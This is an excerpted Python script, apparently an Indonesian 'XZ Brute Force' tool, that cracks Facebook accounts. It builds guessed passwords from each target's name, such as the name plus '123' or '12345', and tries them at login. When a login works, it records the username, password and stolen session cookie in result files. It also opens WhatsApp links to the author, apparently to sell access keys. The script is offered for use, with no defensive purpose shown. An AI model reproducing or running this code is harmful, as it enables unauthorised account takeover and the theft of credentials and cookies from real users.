# code by Ahmed XD
# my facebook ( https://www.facebook.com/AhmedAlzwage )
...
def yayanxd():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/6281318306972?text=Hallo')
        moch_yayan()
...
def moch_yayan():
    ...
    IP = ipm["origin"]
    print("===============================================")
    print(f"{P} [{H}*{P}] Author      :{K} Ahmed Alzwage ")
    print(f"{P} [{H}*{P}] Whatsapp    :{K} +218921762445")
    print(f"{P} [{H}*{P}] Nama SC     :{K} XZ Brute Force")
    print(f"{P} [{H}*{P}] Versi SC    :{K} V1.0{P}")
    print("===============================================")
    ...
    if pepek == '':
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/00218921762445?text=Ini+Gratis+Apa+Harus+Beli...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
...
def cok():
    ...
    if key == '':
        ...
        jalan("\n %s* %sAnda akan di alihkan ke whatsapp..."%(O,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/00218921762445?text=Hallo');cok()
...
class __crack__:
    ...
    def plerr(self,id):
        ...
        ___yayanganteng___ = input(' [%s?%s] Apakah ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
                ...
                if "c_user" in cok:
                    print(f'\r {P}[{H}OK{P}]{H} {user}|{pw}|{convert_cookie(cok)}{N}')
                    wrt = ' [✓] %s|%s|%s' % (user,pw,convert_cookie(cok))
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.henceut(REQ,convert_cookie(cok))
                    break
                    ...
                    try:
                        ...
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print(f'\r {P}[{K}CP{P}]{K} {user}|{pw}|{day} {month} {year}     {N}')
                        wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    ...
                    print(f'\r {P}[{K}CP{P}]{K} {user}|{pw}                {N}')
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                ...
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"123456"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"123456"]
